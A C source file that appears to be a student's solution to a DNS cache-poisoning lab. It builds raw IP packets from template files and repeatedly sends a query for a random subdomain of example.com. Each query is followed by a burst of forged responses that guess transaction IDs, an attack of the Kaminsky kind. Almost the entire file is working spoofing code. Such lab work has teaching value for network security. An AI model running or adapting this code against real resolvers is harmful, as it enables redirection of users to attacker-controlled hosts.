#include <stdlib.h>
#include <arpa/inet.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <time.h>

#define MAX_FILE_SIZE 1000000

//init ip header
/* IP Header */
struct ipheader {
  unsigned char      iph_ihl:4, //IP header length
                     iph_ver:4; //IP version
  unsigned char      iph_tos; //Type of service
  unsigned short int iph_len; //IP Packet length (data + header)
  unsigned short int iph_ident; //Identification
  unsigned short int iph_flag:3, //Fragmentation flags
                     iph_offset:13; //Flags offset
  unsigned char      iph_ttl; //Time to Live
  unsigned char      iph_protocol; //Protocol type
  unsigned short int iph_chksum; //IP datagram checksum
  struct  in_addr    iph_sourceip; //Source IP address 
  struct  in_addr    iph_destip;   //Destination IP address 
};

//init functions to ouse
void send_raw_packet(char * buffer, int pkt_size);
void send_dns_request(char *name, unsigned char *ip_req, int n_req);
void send_dns_response(char *name, int tid, unsigned char *ip_resp, int n_resp);




//main
int main()
{
  long i = 0;

  srand(time(NULL)); //init the seed for random num gen



  char a[26]="abcdefghijklmnopqrstuvwxyz"; //create char list to pick letters from

  //setup udp request packet
  FILE * f_req = fopen("ip_req.bin", "rb");
  if (!f_req) {
     perror("Can't open 'ip_req.bin'"); // send error if file not openable
     exit(1);
  }

  unsigned char ip_req[MAX_FILE_SIZE];
  int n_req = fread(ip_req, 1, MAX_FILE_SIZE, f_req); //n_req is size and ip_req is buffer

  //setup udp response packt
  FILE * f_resp = fopen("ip_resp.bin", "rb");
  if (!f_resp) {
     perror("Can't open 'ip_resp.bin'");
     exit(1);
  }
  unsigned char ip_resp[MAX_FILE_SIZE];
  int n_resp = fread(ip_resp, 1, MAX_FILE_SIZE, f_resp); //n_resp is size and ip_resp is buffer



  while (1) {

    unsigned short transaction_id = 1000;

    // Generate a random name with length 5
    char name[5];
    for (int k=0; k<5; k++)  name[k] = a[rand() % 26]; //randomly create 5 letter string

    printf("attempt #%ld. request is [%s.example.com], transaction ID is: [%hu]\n", ++i, name, transaction_id); 

    send_dns_request(name, ip_req, n_req); //send out dns request 
    sleep(0.65);
    for (transaction_id = 1000; transaction_id < 1101; transaction_id++){
      send_dns_response(name, transaction_id, ip_resp, n_resp);
	 //send out 100 dns responses (after 100-200 responses, we are too slow and real response already arrived)

    }
    sleep(0.09); //without this my laptop got fried, important!




  
  }
}


/* Use for sending DNS request.
 * Add arguments to the function definition if needed.
 * */
//------------------------------------------------------------//------------------------------------------------------------
void send_dns_request(char *name, unsigned char *ip_req, int n_req)
{

  

  memcpy(ip_req+41, name , 5); //all we gotta do is edit the 5 letter start for xxxxx.exampkle.com (found using blesss)
  

  send_raw_packet(ip_req, n_req); //send'er out!

}


/* Use for sending forged DNS response.
 * Add arguments to the function definition if needed.
 * */

void send_dns_response(char *name, int tid, unsigned char *ip_resp, int n_resp)
{
 
  memcpy(ip_resp+41, name, 5); //all we gotta do is edit the 5 letter start for xxxxx.exampkle.com (found using blesss)
  memcpy(ip_resp+64, name , 5); //all we gotta do is edit the 5 letter start for xxxxx.exampkle.com (found using blesss)

  unsigned short id_net_order = htons(tid); //make the transaction id in little endian binary

  memcpy(ip_resp+28, &id_net_order, 2); //put the transaction inside payload (always at index 28)


  send_raw_packet(ip_resp, n_resp);


}


/* Send the raw packet out 
 *    buffer: to contain the entire IP packet, with everything filled out.
 *    pkt_size: the size of the buffer.
 * */
//I did not modify this
void send_raw_packet(char * buffer, int pkt_size)
{
  struct sockaddr_in dest_info;
  int enable = 1;

  // Step 1: Create a raw network socket.
  int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

  // Step 2: Set socket option.
  setsockopt(sock, IPPROTO_IP, IP_HDRINCL,
	     &enable, sizeof(enable));

  // Step 3: Provide needed information about destination.
  struct ipheader *ip = (struct ipheader *) buffer;
  dest_info.sin_family = AF_INET;
  dest_info.sin_addr = ip->iph_destip;

  // Step 4: Send the packet out.
  sendto(sock, buffer, pkt_size, 0,
       (struct sockaddr *)&dest_info, sizeof(dest_info));
  close(sock);
}
